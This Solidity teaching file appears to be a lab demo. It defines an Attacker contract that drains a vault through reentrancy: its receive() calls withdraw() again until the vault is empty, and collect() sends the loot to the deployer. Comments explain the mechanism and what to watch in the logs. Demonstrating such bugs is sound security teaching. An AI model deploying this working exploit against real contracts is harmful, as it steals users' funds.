// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "hardhat/console.sol";
import "./IVault.sol";

// Concept: the attacking side of a reentrancy bug.
// The attacker is a contract, because only a contract can run code at the
// moment it receives ETH. Its receive function calls withdraw again while
// the vault is still in the middle of the first withdraw.
//
// Deploy with the vault's address and a flag:
//   false   a blocked re-entry makes the whole transaction revert
//   true    a blocked re-entry is caught, so the transaction completes and
//           its logs and events stay visible
//
// Try: set VALUE to 1 Ether and click attack.
// Look for: the depth counter in the console.
contract Attacker {
    IVault public immutable vault;
    address public immutable owner;
    bool public immutable catchFailure;

    // How many times receive ran during the last attack
    uint256 public depth;

    event Reentered(uint256 depth, uint256 vaultHolds);
    event ReentryBlocked(uint256 depth);
    event AttackFinished(uint256 depth, uint256 loot);

    constructor(IVault vault_, bool catchFailure_) {
        vault = vault_;
        owner = msg.sender;
        catchFailure = catchFailure_;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send exactly 1 ether");
        depth = 0;

        console.log("Attacker.attack: depositing 1 ether, then withdrawing");
        vault.deposit{value: 1 ether}();
        vault.withdraw();

        console.log("Attacker.attack: done, attacker holds %s wei", address(this).balance);
        emit AttackFinished(depth, address(this).balance);
    }

    // Runs every time the vault sends ETH to this contract
    receive() external payable {
        depth += 1;
        uint256 vaultHolds = address(vault).balance;
        console.log("  Attacker.receive: depth %s, got %s wei, vault holds %s", depth, msg.value, vaultHolds);

        // Nothing left to take: stop, so the calls can unwind
        if (vaultHolds < 1 ether) {
            return;
        }

        emit Reentered(depth, vaultHolds);

        if (catchFailure) {
            try vault.withdraw() {
                // The re-entry worked
            } catch {
                console.log("  Attacker.receive: re-entry was blocked");
                emit ReentryBlocked(depth);
            }
        } else {
            vault.withdraw();
        }
    }

    // Moves the loot to the account that deployed the attacker
    function collect() external {
        require(msg.sender == owner, "Not owner");
        uint256 amount = address(this).balance;
        (bool ok, ) = owner.call{value: amount}("");
        require(ok, "Collect failed");
        console.log("Attacker.collect: %s wei sent to %s", amount, owner);
    }
}
